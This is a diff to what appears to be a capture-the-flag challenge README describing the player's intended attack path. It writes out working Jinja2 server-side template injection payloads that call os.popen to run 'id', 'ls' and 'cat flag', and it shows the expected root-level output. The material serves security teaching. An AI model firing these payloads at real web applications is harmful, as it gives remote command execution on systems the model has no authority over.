@@ -14,24 +14,24 @@
 
 ## Attack flow (what the player will do inside the app)
 
-## 1.In the search box the player first submits:
+## 1. In the search box the player first submits:
 ```{{7*7}}```
 + This will render and show 49.
 
-## 2.Next they try to gather system information using SSTI:
+## 2. Next they try to gather system information using SSTI:
 
 ```{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}```
 
 + This will show something like:
 ```uid=0(root) gid=0(root) groups=0(root)```
 
-## 3.Then they list files in the current directory:
+## 3. Then they list files in the current directory:
 
 ```{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}```
 
 + This will show entries including flag (and other files).
 
-## 4.Finally they read the flag file with:
+## 4. Finally they read the flag file with:
 
 ```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
